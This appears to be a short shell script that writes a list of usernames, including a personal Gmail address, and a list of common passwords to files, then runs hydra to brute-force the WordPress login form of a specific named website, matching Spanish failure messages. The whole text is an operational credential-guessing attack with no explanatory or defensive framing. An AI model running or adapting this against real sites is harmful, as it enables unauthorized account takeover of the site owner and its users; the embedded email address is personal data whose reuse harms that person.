
echo -e "admin\njeisim18@gmail.com\n@gmail.com" > correos.txt

echo -e "123456\nadmin123\ncontraseña123\npascual2025\n|wAVKAaeW6" > contrasenas.txt

hydra -L correos.txt -P contrasenas.txt pascualbravo.ingejei.com https-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acceder:F=La contraseña que has introducido para la dirección de correo electrónico no es correcta|El nombre de usuario no está registrado" -V
